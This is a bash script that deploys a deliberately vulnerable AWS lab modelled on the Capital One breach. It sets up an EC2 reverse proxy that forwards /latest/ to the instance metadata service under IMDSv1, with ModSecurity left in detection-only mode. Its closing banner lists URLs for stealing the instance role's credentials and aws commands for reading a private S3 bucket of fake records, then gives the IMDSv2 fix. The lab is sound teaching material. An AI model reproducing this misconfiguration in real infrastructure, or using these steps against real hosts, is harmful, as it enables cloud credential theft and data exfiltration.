#!/usr/bin/env bash
# Capital One–shaped lab: misconfigured WAF (Apache + mod_proxy + ModSecurity)
# on EC2, IMDSv1, over-privileged WAF instance role, private S3.
# The WAF reverse-proxies /latest/ to 169.254.169.254 — that is the SSRF.
set -euo pipefail

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
NAME="capone-imds-lab"
SUFFIX="$(openssl rand -hex 4)"
BUCKET="imds-ssrf-lab-${SUFFIX}"
ROLE="capone-WAF-Role"
PROFILE_NAME="capone-WAF-Role"
SG_NAME="${NAME}-waf"
INSTANCE_NAME="capone-WAF"

echo "==> identity / region"
ID_JSON="$(aws sts get-caller-identity --output json)"
ACCOUNT="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" <<<"$ID_JSON")"
ARN="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" <<<"$ID_JSON")"
echo "    account=$ACCOUNT"
echo "    arn=$ARN"
echo "    region=$REGION"
echo "    bucket=$BUCKET"
echo "    role=$ROLE"

AMI="$(aws ssm get-parameters \
  --names /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
  --region "$REGION" \
  --query 'Parameters[0].Value' --output text)"

VPC="$(aws ec2 describe-vpcs --region "$REGION" --filters Name=isDefault,Values=true \
  --query 'Vpcs[0].VpcId' --output text)"
if [[ -z "$VPC" || "$VPC" == "None" ]]; then
  echo "No default VPC in $REGION. Create one or set a subnet yourself." >&2
  exit 1
fi
SUBNET="$(aws ec2 describe-subnets --region "$REGION" \
  --filters Name=vpc-id,Values="$VPC" Name=default-for-az,Values=true \
  --query 'Subnets[0].SubnetId' --output text)"

echo "==> S3 bucket (private) + sample object"
aws s3api create-bucket --bucket "$BUCKET" --region "$REGION" \
  $([[ "$REGION" == "us-east-1" ]] || echo --create-bucket-configuration LocationConstraint="$REGION") >/dev/null
aws s3api put-public-access-block --bucket "$BUCKET" --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
aws s3api put-bucket-tagging --bucket "$BUCKET" --tagging "TagSet=[{Key=Project,Value=${NAME}}]"
TMPOBJ="$(mktemp)"
cat >"$TMPOBJ" <<'EOF'
CONFIDENTIAL - LAB DATA ONLY (fake)
account_id,name,card_last4
1001,A. Rivera,4412
1002,J. Chen,7781
1003,M. Okonkwo,9920
note: This file exists only to demonstrate IMDSv1 credential theft via a misconfigured WAF.
EOF
aws s3 cp "$TMPOBJ" "s3://${BUCKET}/secret/customer-records.txt" --region "$REGION" >/dev/null
rm -f "$TMPOBJ"

echo "==> WAF instance role (list buckets + read this bucket)"
if ! aws iam get-role --role-name "$ROLE" >/dev/null 2>&1; then
  aws iam create-role --role-name "$ROLE" --tags "Key=Project,Value=${NAME}" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null
fi
POLICY="$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {"Sid":"ListBuckets","Effect":"Allow","Action":"s3:ListAllMyBuckets","Resource":"*"},
    {"Sid":"ReadWafBucket","Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],
     "Resource":["arn:aws:s3:::${BUCKET}","arn:aws:s3:::${BUCKET}/*"]}
  ]
}
EOF
)"
aws iam put-role-policy --role-name "$ROLE" --policy-name s3-read --policy-document "$POLICY"
aws iam attach-role-policy --role-name "$ROLE" \
  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore >/dev/null 2>&1 || true
if ! aws iam get-instance-profile --instance-profile-name "$PROFILE_NAME" >/dev/null 2>&1; then
  aws iam create-instance-profile --instance-profile-name "$PROFILE_NAME" --tags "Key=Project,Value=${NAME}" >/dev/null
  aws iam add-role-to-instance-profile --instance-profile-name "$PROFILE_NAME" --role-name "$ROLE"
fi
echo "    waiting for instance profile..."
sleep 15

echo "==> security group (tcp/80)"
SG="$(aws ec2 create-security-group --region "$REGION" --group-name "$SG_NAME-$SUFFIX" \
  --description "Capital One WAF lab - port 80" --vpc-id "$VPC" \
  --tag-specifications "ResourceType=security-group,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${SG_NAME}}]" \
  --query GroupId --output text)"
aws ec2 authorize-security-group-ingress --region "$REGION" --group-id "$SG" \
  --protocol tcp --port 80 --cidr 0.0.0.0/0 >/dev/null

USERDATA="$(mktemp)"
cat >"$USERDATA" <<'UD'
#!/bin/bash
set -eux
exec > /var/log/capone-waf-lab.log 2>&1
dnf install -y httpd
dnf install -y mod_security || true

mkdir -p /var/www/waf
cat > /var/www/waf/index.html << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>ModSecurity WAF</title></head>
<body>
<h1>ModSecurity WAF</h1>
<p>Reverse proxy is up. Application traffic is inspected here.</p>
<p>Server: Apache httpd + ModSecurity. Role: capone-WAF-Role.</p>
</body>
</html>
HTML

cat > /etc/httpd/conf.d/waf-proxy.conf << 'CONF'
# Misconfiguration (Capital One–shaped):
# The WAF reverse-proxies /latest/ to the link-local metadata service.
# GET http://<waf>/latest/meta-data/... is issued *by Apache on this instance*
# to 169.254.169.254. The attacker never talks to IMDS from the internet.
<VirtualHost *:80>
    ServerName waf
    DocumentRoot /var/www/waf
    <IfModule headers_module>
        Header always set X-WAF "ModSecurity"
    </IfModule>
    ProxyPreserveHost Off
    ProxyPass        /latest/ http://169.254.169.254/latest/
    ProxyPassReverse /latest/ http://169.254.169.254/latest/
    <Directory /var/www/waf>
        Require all granted
    </Directory>
</VirtualHost>
CONF

# ModSecurity: present, but do not block the metadata proxy (the misconfig).
if [ -f /etc/httpd/conf.d/mod_security.conf ]; then
  sed -i 's/SecRuleEngine On/SecRuleEngine DetectionOnly/' /etc/httpd/conf.d/mod_security.conf || true
fi

systemctl enable --now httpd
apachectl configtest || true
systemctl restart httpd
echo READY > /tmp/lab-ready
UD

echo "==> EC2 t3.micro WAF, IMDSv1 (HttpTokens=optional)"
IID="$(aws ec2 run-instances --region "$REGION" \
  --image-id "$AMI" --instance-type t3.micro \
  --subnet-id "$SUBNET" --security-group-ids "$SG" \
  --iam-instance-profile "Name=${PROFILE_NAME}" \
  --metadata-options HttpTokens=optional,HttpEndpoint=enabled,HttpPutResponseHopLimit=1 \
  --user-data "file://${USERDATA}" \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${INSTANCE_NAME}},{Key=LabBucket,Value=${BUCKET}}]" \
  --query 'Instances[0].InstanceId' --output text)"
rm -f "$USERDATA"
echo "    instance=$IID"
aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID"
PUB="$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)"
echo "    public_ip=$PUB"
echo "    waiting for WAF (user-data install)..."
for i in $(seq 1 48); do
  if curl -fsS -m 3 "http://${PUB}/" >/dev/null 2>&1; then
    echo "    http ready"
    break
  fi
  sleep 5
done

cat <<EOF

============================================================
WAF is up. IMDSv1 is allowed (HttpTokens=optional).

This is an Apache reverse proxy (ModSecurity-shaped) that
proxies /latest/ to the instance metadata service. That is
the SSRF. There is no ?url= fetcher.

Public IP:     $PUB
Bucket:        s3://$BUCKET/secret/customer-records.txt
Instance:      $IID
Role:          $ROLE

WAF home:

  http://${PUB}/

Trick the WAF into fetching IMDS (browser address bar or curl):

  http://${PUB}/latest/meta-data/iam/security-credentials/

then:

  http://${PUB}/latest/meta-data/iam/security-credentials/${ROLE}

Then, with the JSON keys (unset AWS_PROFILE):

  aws sts get-caller-identity
  aws s3 ls
  aws s3 ls s3://${BUCKET} --recursive
  aws s3 cp s3://${BUCKET}/secret/customer-records.txt -

Require IMDSv2:

  aws ec2 modify-instance-metadata-options --instance-id ${IID} --http-tokens required

Reload the same /latest/ URLs. Expect HTTP 401.

Destroy:

  ./destroy.sh

Port 80 is open. Tear it down when you are done.
============================================================
EOF
